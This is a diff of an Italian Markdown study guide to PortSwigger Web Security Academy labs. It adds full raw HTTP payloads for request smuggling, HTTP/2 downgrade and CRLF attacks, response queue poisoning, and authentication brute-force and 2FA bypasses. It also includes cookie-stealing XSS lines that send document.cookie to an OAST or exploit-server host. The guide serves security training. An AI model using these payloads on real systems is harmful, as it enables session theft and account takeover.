-- Soluzione: inviare una richiesta "attacco" che termina con l'inizio di una richiesta malformata (`GET /404 ...`) dopo un chunk `0`; poi inviare una richiesta "normale" sulla stessa connessione: se riceve una risposta 404 invece di quella attesa, l'interferenza è confermata.
-- Payload: corpo chunked `e\r\nq=smuggling&x=\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nFoo: x` con `Content-Length` che copre solo fino a `Foo: x`
+- Segnale: vuoi confermare un CL.TE senza disturbare altri utenti.
+- Soluzione: smugglare `GET /404` dopo lo `0`; la seconda richiesta (per `/`) riceve un 404, confermando l'interferenza.
+- Payload (invia due volte → la 2ª riceve `404`):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+```
 - Link: [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)
 - Step: 1
 
 **5. Conferma TE.CL via risposte differenziali**
 
-- Segnale: stesso principio ma per il caso TE.CL.
-- Soluzione: usare `Transfer-Encoding: chunked` con un chunk che dichiara una lunghezza (`7b`) che include l'intera richiesta malformata successiva (`GET /404 ...`); il back-end (che usa CL) tratterà quel blocco come corpo e lascerà la richiesta normale successiva incollata, causando un 404.
-- Payload: `Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n7b\r\nGET /404 HTTP/1.1\r\nHost: VULN\r\nContent-Type: ...\r\nContent-Length: 144\r\n\r\nx=\r\n0\r\n\r\n`
+- Segnale: stesso principio, caso TE.CL. Disattiva "Update Content-Length".
+- Soluzione: chunk `5e` che include l'intera richiesta malformata `POST /404`; il back-end (CL) la tratta come corpo e lascia la successiva incollata → 404.
+- Payload (due volte → la 2ª riceve `404`; includi `\r\n\r\n` dopo lo `0`):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
 - Link: [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
 - Step: 1
 
@@ -494,79 +832,240 @@ Il sink non è nella risposta HTTP ma nel JavaScript lato client: va trovato il 
 
 **6. Bypass dei controlli di sicurezza del front-end (CL.TE)**
 
-- Segnale: il front-end applica controlli di accesso su URL specifici (es. nega `/admin`) e poi forwarda al back-end che si fida ciecamente.
-- Soluzione: smugglare una richiesta `GET /admin` dentro una richiesta apparentemente per un URL permesso (`/home`); il front-end vede solo richieste a `/home`, il back-end vede una richiesta separata per `/admin`.
-- Payload: `POST /home HTTP/1.1\r\nHost: VULN\r\nContent-Length: 62\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: VULN\r\nFoo: xGET /home HTTP/1.1\r\nHost: VULN\r\n\r\n`
+- Segnale: il front-end blocca `/admin`, il back-end si fida. La richiesta smugglata va completata con `Host: localhost` e un `Content-Length` che "assorbe" gli header della richiesta successiva.
+- Soluzione: smugglare `GET /admin/delete?username=carlos` con `Host: localhost`; il `Content-Length: 10` finale fa sì che gli header della richiesta normale successiva finiscano nel corpo (`x=`), evitando conflitti.
+- Payload (cancella carlos — invia due volte):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
 - Link: [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
 - Step: 2
 
 **7. Bypass dei controlli di sicurezza del front-end (TE.CL)**
 
-- Segnale: stesso scenario del lab precedente ma con variante TE.CL.
-- Soluzione: stessa logica, adattando l'header usato per la discrepanza (TE lato front-end, CL lato back-end).
-- Payload: analogo al CL.TE ma con `Content-Length` impostato per il back-end e `Transfer-Encoding: chunked` elaborato dal front-end
+- Segnale: come sopra ma TE.CL. Disattiva "Update Content-Length".
+- Soluzione: chunk `87` che contiene la richiesta `/admin/delete` completa con `Host: localhost`.
+- Payload (cancella carlos — due volte; includi `\r\n\r\n` dopo lo `0`):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
 - Link: [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)
 - Step: 2
 
 **8. Rivelare il rewriting delle richieste da parte del front-end**
 
-- Segnale: il front-end aggiunge header (`X-Forwarded-For`, header TLS, ID utente) prima di forwardare al back-end; vuoi scoprire quali per costruire smuggling più precisi.
-- Soluzione: trovare un endpoint che riflette un parametro POST (es. `email` in una pagina di login); smugglare una richiesta a quell'endpoint con il parametro riflesso posizionato per ultimo nel corpo, seguita dalla richiesta "normale" di cui vuoi vedere il rewriting — il back-end tratterà l'intera richiesta normale riscritta come valore del parametro, che poi viene riflesso in risposta.
-- Payload: smuggle `POST /login HTTP/1.1\r\n...\r\n\r\nemail=` + (qui verrà accodata la richiesta normale riscritta dal front-end, inclusi i suoi nuovi header)
+- Segnale: `/admin` è accessibile solo da `127.0.0.1`; il front-end aggiunge un header IP (tipo `X-Forwarded-For` ma con nome diverso). C'è una search che riflette il parametro.
+- Soluzione: smugglare una `POST /` verso la search con `Content-Length` sovradimensionato, così la richiesta normale successiva (riscritta dal front-end, header IP incluso) viene riflessa come valore di `search`; letto il nome dell'header, lo si usa per accedere ad `/admin` e cancellare carlos.
+- Payload — rivela l'header riscritto (due volte; cerca "Search results for" + inizio richiesta riscritta):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=test
+```
+- Payload — cancella carlos usando l'header scoperto (`X-abcdef-Ip` è un esempio, usa il tuo):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 166
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-abcdef-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+```
 - Link: [Exploiting HTTP request smuggling to reveal front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)
 - Step: 2
 
 **9. Catturare le richieste di altri utenti**
 
-- Segnale: l'app ha una funzione che salva e mostra testo (commenti, profilo, ecc.); vuoi rubare dati sensibili (cookie di sessione) di altri utenti.
-- Soluzione: smugglare una richiesta di invio commento con un `Content-Length` artificiosamente alto e il parametro `comment` posizionato per ultimo (senza valore); il back-end attende più byte, e la richiesta della prossima vittima sulla stessa connessione viene accodata come valore di `comment` — poi basta leggere il commento pubblicato per vedere i dati della vittima (fino al primo `&`).
-- Payload: smuggle `GET / HTTP/1.1\r\nHost: VULN\r\nTransfer-Encoding: chunked\r\nContent-Length: 330\r\n\r\n0\r\n\r\nPOST /post/comment HTTP/1.1\r\nHost: VULN\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 400\r\nCookie: session=...\r\n\r\ncsrf=...&postId=2&name=...&email=...&website=...&comment=`
+- Segnale: funzione commenti che salva e mostra testo. Obiettivo: catturare la richiesta (e il cookie) della prossima vittima.
+- Soluzione: riordinare i parametri del commento così `comment` è l'ultimo, poi smugglare la POST del commento con `Content-Length: 400` sovradimensionato: la richiesta della vittima sulla stessa connessione viene accodata come valore di `comment` e appare nel commento pubblicato. Se il cookie è troncato, aumenta gradualmente il `Content-Length`.
+- Payload (poi leggi il commento per vedere la richiesta/cookie della vittima):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=your-session-token
+
+csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+```
 - Link: [Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)
 - Step: 2
 
 **10. Sfruttare XSS riflessa via request smuggling**
 
-- Segnale: esiste un XSS riflesso in un header (es. `User-Agent`) difficile da sfruttare normalmente perché l'attaccante non controlla facilmente gli header delle richieste altrui.
-- Soluzione: smugglare una richiesta con il payload XSS nell'header vulnerabile; la prossima richiesta di un'altra vittima verrà accodata e processata come se contenesse quell'header, colpendo la vittima senza bisogno che clicchi nulla.
-- Payload: smuggle `GET / HTTP/1.1\r\nHost: VULN\r\nContent-Length: 63\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nUser-Agent: <script>alert(1)</script>\r\nFoo: X`
-- Payload da esame (Burp Collaborator): smuggle `GET / HTTP/1.1\r\nHost: VULN\r\nContent-Length: 63\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nUser-Agent: <script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>\r\nFoo: X`
+- Segnale: reflected XSS via header `User-Agent` (riflesso in un input nascosto del form commenti); difficile da sfruttare perché non controlli gli header altrui.
+- Soluzione: smugglare una richiesta con il payload XSS nello `User-Agent`; la prossima vittima riceve la risposta avvelenata senza cliccare nulla.
+- Payload (`alert(1)` — `Content-Length: 150`):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+- Payload da esame (Burp Collaborator/OAST): sostituisci lo `User-Agent` con un cookie-stealer e **ricalcola** il `Content-Length` della richiesta esterna.
+```
+User-Agent: a"/><script>document.location='https://OASTIFY.COM/?c='+document.cookie</script>
+```
 - Link: [Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)
 - Step: 1
 
 ### D. HTTP/2 downgrading e varianti avanzate
 
+> Imposta il protocollo su **HTTP/2** nell'Inspector di Burp. Per i lab CRLF si usa l'Inspector per aggiungere un header il cui **valore contiene `\r\n` letterali**.
+
 **11. H2.CL request smuggling**
 
-- Segnale: il front-end parla HTTP/2 col client ma esegue il "downgrading" verso un back-end HTTP/1; se il front-end riutilizza un header `content-length` iniettato nella richiesta HTTP/2 (invece di calcolarlo dalla lunghezza reale dei frame) senza validarlo, nasce una discrepanza.
-- Soluzione: inviare una richiesta HTTP/2 con un `content-length` falso (es. 0) seguito da dati extra nel corpo; il front-end (che fida sulla lunghezza HTTP/2 nativa) la forwarda intera, ma il back-end HTTP/1 legge solo i primi N byte indicati da quel `content-length` taroccato, lasciando il resto come richiesta successiva smugglata.
-- Payload: pseudo-headers HTTP/2 `:method POST`, `:path /example`, `content-length 0` + corpo `GET /admin HTTP/1.1\r\nHost: VULN\r\nContent-Length: 10\r\n\r\nx=1`
+- Segnale: il front-end fa downgrade di HTTP/2 → HTTP/1 fidandosi di un `content-length` iniettato (es. `0`) invece della lunghezza reale dei frame. Obiettivo: far caricare alla vittima un JS malevolo dall'exploit server.
+- Soluzione: smugglare l'inizio di `GET /resources` con un `Host` arbitrario: reindirizza la richiesta successiva della vittima verso l'exploit server, dove ospiti `/resources` con `alert(document.cookie)`.
+- Payload (`Content-Length: 0` nella richiesta HTTP/2; file `/resources` sull'exploit server = `alert(document.cookie)`):
+```
+POST / HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+Content-Length: 5
+
+x=1
+```
+- Payload da esame (Burp Collaborator/OAST): nel corpo del file sull'exploit server, esfiltra il cookie.
+```javascript
+document.location='https://OASTIFY.COM/?c='+document.cookie
+```
 - Link: [H2.CL request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)
 - Step: 1
 
 **12. Response queue poisoning via H2.TE request smuggling**
 
-- Segnale: come H2.CL, ma la discrepanza riguarda `transfer-encoding: chunked` iniettato in una richiesta HTTP/2 (che per spec non dovrebbe essere permesso/dovrebbe essere rimosso prima del downgrade) e non viene filtrato dal front-end.
-- Soluzione: smugglare una richiesta completa e autonoma (due richieste in una, non solo un prefisso) così il back-end genera due risposte distinte mentre il front-end ne aspetta solo una; questo desincronizza la coda di risposte: da quel momento ogni nuova richiesta sulla stessa connessione riceve la risposta destinata a un altro utente. Si ripete l'invio di richieste per "pescare" risposte altrui (incluse quelle con dati sensibili/sessioni).
-- Payload: HTTP/2 con `transfer-encoding: chunked` iniettato, corpo `0\r\n\r\nGET /anything HTTP/1.1\r\nHost: VULN\r\n\r\nGET / HTTP/1.1\r\nHost: VULN\r\n\r\n` (due richieste complete smugglate in una)
+- Segnale: il front-end fa downgrade di HTTP/2 anche con `transfer-encoding: chunked` iniettato (lunghezza ambigua). Obiettivo: rubare la sessione dell'admin via response queue poisoning.
+- Soluzione: smugglare una richiesta **completa e autonoma** verso un endpoint inesistente (`/x`): il back-end genera una risposta in più, desincronizzando la coda. Rinviando la richiesta ogni ~5s si "pescano" le risposte altrui finché si cattura il `302` col cookie di sessione dell'admin; poi `GET /admin` e cancella carlos.
+- Payload (smuggla una richiesta completa; termina con `\r\n\r\n` dopo l'`Host`):
+```
+POST /x HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Transfer-Encoding: chunked
+
+0
+
+GET /x HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+
+```
+- Payload (usa il cookie admin catturato):
+```
+GET /admin HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=STOLEN-SESSION-COOKIE
+```
 - Link: [Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
 - Step: 2
 
 **13. HTTP/2 request smuggling via CRLF injection**
 
-- Segnale: a differenza dell'HTTP/1, in HTTP/2 (binario, a frame) la sequenza `\r\n` dentro un valore di header non ha significato speciale e può essere iniettata liberamente; ma una volta riscritta come richiesta HTTP/1 dal front-end durante il downgrade, quel `\r\n` torna a essere un delimitatore di header.
-- Soluzione: iniettare `\r\n` nel valore di un header HTTP/2 qualsiasi per far "apparire" un secondo header arbitrario (es. `Transfer-Encoding: chunked`) solo lato back-end dopo il downgrade, bypassando i filtri del front-end che normalmente bloccherebbero quell'header se scritto esplicitamente.
-- Payload: header HTTP/2 `foo: bar\r\nTransfer-Encoding: chunked` (il CRLF letterale incorporato nel valore dell'header)
+- Segnale: il front-end fa downgrade di HTTP/2 e non sanifica i `\r\n` dentro i valori degli header; un `\r\n` iniettato diventa un delimitatore di header lato back-end. Obiettivo: rubare il cookie di sessione della vittima (legato alla search history).
+- Soluzione: nell'Inspector aggiungi un header `foo` il cui valore contiene `\r\n` seguito da `Transfer-Encoding: chunked`; nel corpo smuggla una richiesta che accoda la richiesta della vittima alla `search`, così la sua request-line (col cookie) finisce nella cronologia ricerche.
+- Payload — header nell'Inspector (valore su più righe con CRLF letterali):
+```
+foo: bar\r\n
+Transfer-Encoding: chunked
+```
+- Payload — corpo della richiesta HTTP/2:
+```
+0
+
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
+Content-Length: 800
+
+search=x
+```
 - Link: [HTTP/2 request smuggling via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)
 - Step: 1
 
 **14. HTTP/2 request splitting via CRLF injection**
 
-- Segnale: come il caso precedente, ma lo split avviene negli header (non nel body), permettendo lo smuggling anche con metodi senza corpo come `GET`; bisogna fare attenzione a dove viene reiniettato l'header `Host` dal front-end (tipicamente in coda) per assicurarsi che entrambe le richieste risultanti abbiano un `Host` valido.
-- Soluzione: iniettare in un header HTTP/2 una sequenza che, dopo il downgrade, crea un confine tra due richieste HTTP/1 complete direttamente nella sezione header (doppio `\r\n` seguito da una nuova request-line), posizionando un `Host:` iniettato manualmente prima del punto di split per coprire la prima richiesta.
-- Payload: header HTTP/2 `foo: bar\r\nHost: VULN\r\n\r\nGET /admin HTTP/1.1` (nota: `Host` iniettato *prima* del doppio CRLF di split, così finisce nella prima richiesta)
+- Segnale: come sopra, ma lo split avviene negli **header** (non nel body): si creano due richieste HTTP/1 complete, sfruttabile anche con metodi senza corpo. Obiettivo: response queue poisoning → admin → cancella carlos.
+- Soluzione: path verso endpoint inesistente (`/x`); nell'Inspector aggiungi un header il cui valore, dopo il downgrade, chiude gli header (doppio `\r\n`) e apre una seconda richiesta completa con il suo `Host`.
+- Payload — header nell'Inspector (name `foo`, value con CRLF letterali):
+```
+foo: bar\r\n
+\r\n
+GET /x HTTP/1.1\r\n
+Host: YOUR-LAB-ID.web-security-academy.net
+```
+- Payload (dopo aver catturato il `302`, usa il cookie admin):
+```
+GET /admin HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=STOLEN-SESSION-COOKIE
+```
 - Link: [HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
 - Step: 2
-
 
 ## Authentication — Stage tipico: 1-2
 
@@ -576,24 +1075,39 @@ Il sink non è nella risposta HTTP ma nel JavaScript lato client: va trovato il 
 
 **1. Via risposte sottilmente diverse**
 
-- Segnale: il messaggio di errore per "utente non esistente" e "password errata" è quasi identico ma differisce per un dettaglio minimo (un carattere, uno spazio, una maiuscola).
-- Soluzione: confrontare byte-per-byte le risposte per ogni username candidato con una password fissa errata; chi produce la risposta leggermente diversa è un username valido; poi bruteforce della password su quell'utente.
-- Payload: Intruder su `username` con password fissa, grep/confronto sulla lunghezza o contenuto esatto della risposta
+- Segnale: il messaggio di errore per "utente non esistente" e "password errata" è quasi identico ma differisce per un dettaglio minimo. Nel lab: `Invalid username or password.` per l'username valido ha uno **spazio finale** al posto del punto.
+- Soluzione: Intruder sul campo `username` con password fissa + regola **Grep - Extract** sul messaggio d'errore; ordinando per quella colonna, l'username con la risposta leggermente diversa (spazio finale) è valido. Poi bruteforce della password su quell'utente (la risposta corretta dà `302`).
+- Payload (bruteforce password sull'username identificato):
+```
+username=identified-user&password=§invalid-password§
+```
 - Link: [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)
 - Step: 1
 
 **2. Via tempo di risposta**
 
-- Soluzione: inviare una password molto lunga per ogni username candidato; se l'app controlla la password solo dopo aver verificato che l'username esiste, gli username validi avranno un tempo di risposta misurabilmente più lungo.
-- Payload: Intruder con `username=candidato&password=<stringa lunghissima>`, ordinando per tempo di risposta (response time attack)
+- Segnale: l'IP viene bloccato dopo troppi tentativi, ma l'header **`X-Forwarded-For` è supportato** e permette di spoofare l'IP; con un username valido il tempo di risposta cresce con la lunghezza della password (la password viene verificata solo se l'utente esiste).
+- Soluzione: Intruder **Pitchfork** con posizioni su `X-Forwarded-For` (numeri 1–100, per cambiare IP a ogni richiesta ed evitare il blocco) e `username`, con password lunghissima (~100 caratteri); l'username col tempo di risposta nettamente più alto è valido. Poi stesso schema per bruteforzare la password (cerca il `302`).
+- Payload (posizioni Pitchfork: IP spoofato + username, password lunga fissa):
+```
+POST /login HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+X-Forwarded-For: §1§
+Content-Type: application/x-www-form-urlencoded
+
+username=§candidate§&password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+```
 - Link: [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)
 - Step: 1
 
 **3. Via blocco dell'account**
 
-- Segnale: dopo N tentativi falliti su un username valido, la risposta cambia (es. "account bloccato") mentre per username inesistenti no.
-- Soluzione: inviare alcuni tentativi errati per ogni username candidato; chi genera il messaggio di blocco è valido.
-- Payload: N richieste con password sbagliata per ciascun username, poi osservare quale risposta cambia in "too many attempts"
+- Segnale: dopo N tentativi falliti su un username *valido* la risposta cambia (`You have made too many incorrect login attempts.`), mentre per username inesistenti no.
+- Soluzione: Intruder **Cluster bomb** con l'username in posizione 1 e una posizione 2 vuota riempita con **Null payloads** (genera 5 ripetizioni per username); l'username le cui risposte mostrano il messaggio di blocco è valido. Poi Sniper sulla password con grep sul messaggio d'errore: la password giusta è quella **senza** messaggio d'errore (attendi il reset del lock prima di loggarti).
+- Payload (cluster bomb: username + posizione vuota ripetuta):
+```
+username=§invalid-username§&password=example§§
+```
 - Link: [Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)
 - Step: 1
 
@@ -601,19 +1115,30 @@ Il sink non è nella risposta HTTP ma nel JavaScript lato client: va trovato il 
 
 **4. Blocco IP con reset al login riuscito**
 
-- Segnale: il contatore di tentativi falliti per IP si azzera quando da quell'IP avviene un login riuscito (con le proprie credenziali).
-- Soluzione: nella wordlist di attacco, intervallare periodicamente le proprie credenziali valide ogni N tentativi, così il contatore non raggiunge mai il limite di blocco.
-- Payload: Intruder con lista tipo `[guess1, guess2, tue-credenziali, guess3, guess4, tue-credenziali, ...]`
+- Segnale: l'IP viene bloccato dopo 3 login errati di fila, ma il contatore si **azzera** se da quell'IP fai un login riuscito prima di raggiungere il limite.
+- Soluzione: Intruder **Pitchfork** con 1 sola richiesta concorrente (Resource pool → Maximum concurrent requests = 1, per mantenere l'ordine): in posizione `username` alterna il tuo username e `carlos` (il tuo per primo, `carlos` ripetuto ≥100 volte); in posizione `password` metti la tua password valida prima di ogni password candidata (allineate). Filtra via i `200` e ordina per username: l'unico `302` con username `carlos` rivela la sua password.
+- Payload (struttura delle due liste Pitchfork, allineate):
+```
+username: [tuo-user, carlos, carlos, carlos, ...]
+password: [tua-password, guess1, guess2, guess3, ...]
+```
 - Link: [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
 - Step: 1
 
 ### C. Logica 2FA
 
-**5. Logica 2FA rotta (cookie non legato all'utente autenticato)**
+**5. Logica 2FA rotta (verifica non legata alla sessione autenticata)**
 
-- Segnale: dopo il primo step di login viene assegnato un cookie (es. `account=username`) che determina a quale account si applica il codice di verifica nello step 2.
-- Soluzione: completare il primo step con le *proprie* credenziali, poi modificare il valore del cookie `account` con lo username della vittima prima di inviare il codice di verifica; se il codice è bruteforceable (4-6 cifre, nessun rate limit), si può accedere all'account della vittima senza conoscerne la password.
-- Payload: dopo login proprio, `POST /login-steps/second` con `Cookie: account=victim-user` e bruteforce di `verification-code` (0000-9999)
+- Segnale: nella richiesta `POST /login2` (step 2) il parametro **`verify`** determina a quale account si applica il codice 2FA; un `GET /login2` genera un nuovo codice temporaneo per l'utente indicato in `verify`.
+- Soluzione: in Repeater, `GET /login2` con `verify=carlos` per far generare un codice 2FA per la vittima; poi fai login con le *tue* credenziali, invia un codice 2FA errato, manda il `POST /login2` a Intruder impostando `verify=carlos` e bruteforza `mfa-code` (nessun rate limit); carica la risposta `302` nel browser → My account della vittima.
+- Payload (step 2 con verify della vittima + bruteforce del codice):
+```
+POST /login2 HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+verify=carlos&mfa-code=§0000§
+```
 - Link: [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
 - Step: 2
 
@@ -621,17 +1146,23 @@ Il sink non è nella risposta HTTP ma nel JavaScript lato client: va trovato il 
 
 **6. Brute-forcing di un cookie "stay logged in"**
 
-- Segnale: il cookie "remember me" è generato in modo predicibile (es. hash non salato di username+password, o concatenazione di valori statici); crea un tuo account per studiare come è costruito il tuo cookie.
-- Soluzione: identificare l'algoritmo (es. MD5 di `username:password`), poi bruteforzare la password della vittima calcolando l'hash per ogni password candidata e confrontandolo con il cookie osservato (o rubato via un'altra vulnerabilità).
-- Payload: script/Intruder che calcola `md5(victim_username + ':' + candidate_password)` e lo confronta col valore del cookie target
+- Segnale: il cookie `stay-logged-in` è `base64(username + ':' + md5(password))` — si deduce creando il proprio account (il decode dà `wiener:<md5(peter)>`).
+- Soluzione: Intruder sul cookie con **Payload processing** nell'ordine: `Hash: MD5` → `Add prefix: carlos:` → `Encode: Base64-encode`, usando la lista di password candidate; cambia l'`id` in `carlos` e aggiungi una **Grep match** su `Update email` (presente solo se autenticati): l'unica risposta che lo contiene ha ricostruito il cookie valido di carlos.
+- Payload (costruzione del cookie da bruteforzare):
+```
+Cookie: stay-logged-in = base64( "carlos:" + md5(candidate-password) )
+```
 - Link: [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
 - Step: 2
 
 **7. Offline password cracking**
 
-- Segnale: il cookie "remember me" contiene un hash della password (non salato o con algoritmo noto) ottenibile ad es. rubandolo tramite un'altra vulnerabilità (XSS) dal browser della vittima.
-- Soluzione: estrarre l'hash dal cookie e cercarlo tra gli hash di wordlist di password comuni già pre-calcolati (o calcolarli al volo); se la password della vittima è comune, l'hash corrisponderà direttamente, rivelando la password in chiaro.
-- Payload: confronto dell'hash estratto dal cookie contro un dizionario di `md5(password_comune)` per ogni password comune
+- Segnale: il cookie `stay-logged-in` è `base64(username + ':' + md5(password))` e c'è una XSS stored nei commenti per rubare il cookie della vittima.
+- Soluzione: postare un commento con una XSS che manda il cookie al tuo exploit server; dall'access log prendere il cookie di carlos, decodificarlo (`carlos:<md5hash>`) e craccare l'hash (hashcat o motore di ricerca per password comuni); poi login come carlos ed eliminare l'account.
+- Payload (XSS stored nel commento per rubare il cookie):
+```html
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+```
 - Link: [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
 - Step: 2
 
@@ -639,24 +1170,249 @@ Il sink non è nella risposta HTTP ma nel JavaScript lato client: va trovato il 
 
 **8. Password reset poisoning via middleware**
 
-- Segnale: il link di reset password viene generato dinamicamente usando un host che il server deduce da un header della richiesta (es. `Host` o un header tipo `X-Forwarded-Host` gestito da un middleware), non da un valore fisso lato server.
-- Soluzione: richiedere il reset password per la vittima (o indurla a farlo) manipolando l'header host/forwarded della propria richiesta affinché punti al tuo exploit server; l'email generata conterrà un link di reset che punta al tuo dominio con il token valido della vittima; intercettalo e usalo per resettare la sua password.
-- Payload: `POST /forgot-password` con `Host: exploit-server.net` (o `X-Forwarded-Host: exploit-server.net`) e `email=victim@normal-website.com`
+- Segnale: il link di reset password è generato dinamicamente usando l'host preso dall'header **`X-Forwarded-Host`** (gestito da un middleware), non da un valore fisso. La vittima (carlos) clicca qualsiasi link nelle email.
+- Soluzione: inviare `POST /forgot-password` con `X-Forwarded-Host` puntato al tuo exploit server e `username=carlos`; dall'access log dell'exploit server leggere il token di reset della vittima; poi usare il link di reset legittimo (ricevuto via email) sostituendo il `temp-forgot-password-token` con quello rubato, e impostare una nuova password per carlos.
+- Payload (`POST /forgot-password` avvelenato):
+```
+POST /forgot-password HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+
+username=carlos
+```
 - Link: [Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
 - Step: 2
 
 **9. Brute-force password tramite funzione di cambio password**
 
-- Segnale: l'endpoint di cambio password accetta lo username in un campo (anche hidden) modificabile, e non verifica che l'utente autenticato coincida con quello del campo.
-- Soluzione: usare l'endpoint di cambio password (non quello di login, magari protetto da rate-limit più severo) per bruteforzare la password corrente della vittima, modificando il parametro username/current-password in Intruder.
-- Payload: `POST /my-account/change-password` con `username=victim-user&current-password=<candidata>&new-password-1=...&new-password-2=...`, osservando quale candidata non genera errore
+- Segnale: la funzione di cambio password invia lo `username` in un input nascosto modificabile; inserendo la password corrente *giusta* ma due nuove password *diverse* la risposta è `New passwords do not match` (mentre con la corrente *sbagliata* è `Current password is incorrect`). Questo oracolo permette di enumerare la password corretta.
